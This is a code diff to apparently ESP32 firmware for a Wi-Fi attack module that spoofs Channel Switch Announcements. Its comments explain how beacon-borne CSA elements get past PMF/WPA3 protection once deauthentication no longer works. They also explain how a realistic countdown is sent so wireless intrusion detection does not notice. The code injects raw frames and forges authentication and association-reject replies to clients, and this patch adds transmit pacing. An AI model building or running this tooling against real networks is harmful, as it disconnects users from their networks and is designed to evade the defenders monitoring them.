@@ -1,8 +1,12 @@
 // CSA (Channel Switch Announcement) spoofing.
 //
 // Design notes (why it is shaped this way):
-//   * CSA is *not* a robust management frame, so 802.11w/PMF does not verify it.
-//     That is what makes it usable against WPA3 clients when deauth is dead.
+//   * Two announcement paths with different protection status: the Spectrum
+//     Management action frame (category 4 / action 4) is a robust management frame,
+//     so a PMF-enabled client drops an unprotected one (net/mac80211/rx.c); the CSA
+//     IE inside a beacon is not protected by anything, because beacons are not
+//     robust frames. That second path is what keeps CSA usable when deauth is dead,
+//     and it is why this module sends both.
 //   * A real AP announces count N..1 on consecutive beacon ticks. A single
 //     count=1 frame looks like an anomaly to any WIDS, so this sends a monotonic
 //     countdown at ~100 TU (100 ms).
@@ -20,6 +24,7 @@
 #include <string.h>
 
 #include "deauth.h"
+#include "tx_guard.h"
 
 namespace {
 
@@ -195,8 +200,12 @@ size_t build_beacon(uint8_t* frame, uint8_t channel, bool announce, uint8_t coun
     return n;
 }
 
+// Every CSA frame goes through the shared guard: broadcast frames are exempt, and the
+// unicast ones (up to one per known client per 100 ms round) are paced so a BSS with
+// many clients cannot push the radio past the ~32 frames/s the TX pool can recycle
+// (see tx_guard.h). A throttled frame simply goes out in a later round.
 void tx(uint8_t* frame, size_t len) {
-    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK) {
+    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
         s_frames++;
     }
 }
@@ -359,7 +368,7 @@ void csa_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype
             uint8_t reply[32];
             if (subtype == 11) {  // authentication request
                 const size_t n = build_auth_resp(reply, src);
-                if (esp_wifi_80211_tx(WIFI_IF_STA, reply, n, false) == ESP_OK) {
+                if (tx_guard_send(reply, (uint16_t)n) == ESP_OK) {
                     s_frames++;
                     s_auth_replies++;
                 }
@@ -367,7 +376,7 @@ void csa_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype
             }
             if (subtype == 0 || subtype == 2) {  // assoc / reassoc request
                 const size_t n = build_assoc_resp(reply, src);
-                if (esp_wifi_80211_tx(WIFI_IF_STA, reply, n, false) == ESP_OK) {
+                if (tx_guard_send(reply, (uint16_t)n) == ESP_OK) {
                     s_frames++;
                     s_assoc_rejects++;
                 }
